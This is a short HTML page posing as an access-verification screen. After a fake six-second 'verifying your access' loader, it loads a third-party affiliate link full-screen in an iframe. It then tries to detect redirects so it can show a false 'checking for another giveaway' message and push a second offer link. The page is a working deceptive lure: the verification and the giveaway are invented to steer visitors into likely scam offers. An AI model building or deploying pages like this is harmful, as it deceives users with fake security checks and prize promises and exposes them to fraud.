<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verifying Access</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    #loaderPage, #iframeContainer, #redirectMessage {
      display: none;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    iframe {
      width: 100vw;
      height: 100vh;
      border: none;
    }
  </style>
</head>
<body>
  <!-- Step 1: Initial Loader -->
  <div id="loaderPage">
    <h2>Hold on, we're verifying your access...</h2>
    <div class="loader"></div>
  </div>  <!-- Step 2: IFrame Offer Page -->  <div id="iframeContainer">
    <iframe id="offerFrame" src="about:blank"></iframe>
  </div>  <!-- Step 3: Redirect Message -->  <div id="redirectMessage">
    <h2>Hang tight! We're checking for another giveaway...</h2>
    <div class="loader"></div>
  </div>  <script>
    const loaderPage = document.getElementById('loaderPage');
    const iframeContainer = document.getElementById('iframeContainer');
    const offerFrame = document.getElementById('offerFrame');
    const redirectMessage = document.getElementById('redirectMessage');

    let offer1 = "https://wy121.com/link?z=8810180";
    let offer2 = "https://wy121.com/link?z=8949381";

    // Step 1: Show initial loader for 6 seconds
    loaderPage.style.display = 'flex';
    setTimeout(() => {
      loaderPage.style.display = 'none';
      iframeContainer.style.display = 'flex';
      offerFrame.src = offer1;
    }, 6000);

    // Step 2: Detect redirect by polling iframe src every 2s
    let lastSrc = offer1;
    setInterval(() => {
      try {
        let currentSrc = offerFrame.contentWindow.location.href;
        if (currentSrc !== lastSrc) {
          // Detected a redirect
          lastSrc = currentSrc;
          iframeContainer.style.display = 'none';
          redirectMessage.style.display = 'flex';
          setTimeout(() => {
            redirectMessage.style.display = 'none';
            iframeContainer.style.display = 'flex';
            offerFrame.src = offer2;
          }, 5000);
        }
      } catch (err) {
        // cross-origin issue ignored intentionally
      }
    }, 2000);
  </script></body>
</html>
